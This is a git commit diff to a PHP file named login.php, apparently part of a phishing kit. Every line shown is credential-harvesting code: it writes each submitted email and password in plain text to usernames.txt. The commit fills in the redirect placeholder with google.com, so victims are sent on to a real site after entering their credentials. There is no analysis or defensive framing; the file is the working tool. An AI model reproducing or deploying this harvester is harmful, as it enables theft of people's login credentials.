34356b333fe0a356600b0303098799bcde9ad482
PayalKhana143 <69334757+PayalKhana143@users.noreply.github.com>
2020-08-07 09:40:51 +0530

    Update login.php

--- rajni/rajni/login.php
+++ rajni/rajni/login.php
@@ -1,5 +1,5 @@
 <?php # DO NOT EDIT/TAMPER WITH THIS FILE #
 			file_put_contents("usernames.txt", "                [ EMAIL: " . " ". $_POST['email'] . " ]   " . " " . "[ PASSWORD: " . " " . $_POST['pass'] . " ]\n", FILE_APPEND);
-  			header('Location: <REDIRECT>');
+  			header('Location: https://google.com');
 			exit();
 ?>
